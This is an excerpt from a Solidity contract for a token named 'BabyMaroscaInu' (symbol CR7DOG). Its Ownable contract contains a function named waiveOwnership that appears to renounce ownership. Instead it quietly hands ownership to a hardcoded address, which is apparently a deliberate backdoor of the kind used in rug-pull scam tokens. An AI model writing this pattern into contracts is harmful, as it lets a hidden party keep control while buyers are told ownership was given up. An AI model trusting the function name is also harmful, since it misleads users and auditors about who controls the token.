...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x6EB38e250E339D89B146267f8f69471f8e1F0a47));
        _owner = address(0x6EB38e250E339D89B146267f8f69471f8e1F0a47);
    }
...
contract BabyMaroscaInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BabyMaroscaInu";
    string private _symbol = "CR7DOG";
